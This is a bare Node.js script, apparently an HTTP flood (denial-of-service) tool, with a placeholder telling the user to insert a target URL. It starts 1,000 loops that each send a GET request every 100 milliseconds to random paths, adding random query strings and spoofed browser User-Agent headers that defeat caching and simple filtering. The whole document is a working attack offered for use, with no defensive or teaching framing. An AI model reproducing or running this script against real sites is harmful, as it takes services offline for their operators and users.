const http = require('http');

const target = 'http://example.com'; // Replace with target URL
const connections = 1000; // Number of simultaneous connections
const paths = ['/login', '/register', '/home', '/product', '/api/data']; // Predefined paths for random requests

function sendRandomRequest() {
    const randomPath = paths[Math.floor(Math.random() * paths.length)];
    const options = {
        hostname: target.replace('http://', '').replace('https://', ''),
        port: 80,
        path: `${randomPath}?id=${Math.random().toString(36).substring(7)}`, // Add random query parameter
        method: 'GET',
        headers: {
            'User-Agent': `Mozilla/5.0 (Windows NT ${Math.floor(Math.random() * 10)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.${Math.floor(Math.random() * 500)} Safari/537.36`,
            'Connection': 'keep-alive',
        },
    };

    const req = http.request(options, (res) => {
        console.log(`[Request] Path: ${options.path}, Status Code: ${res.statusCode}`);
    });

    req.on('error', (e) => {
        console.error(`Error: ${e.message}`);
    });

    req.end();
}

// Create multiple connections
for (let i = 0; i < connections; i++) {
    setInterval(sendRandomRequest, 100); // Send requests every 100ms
}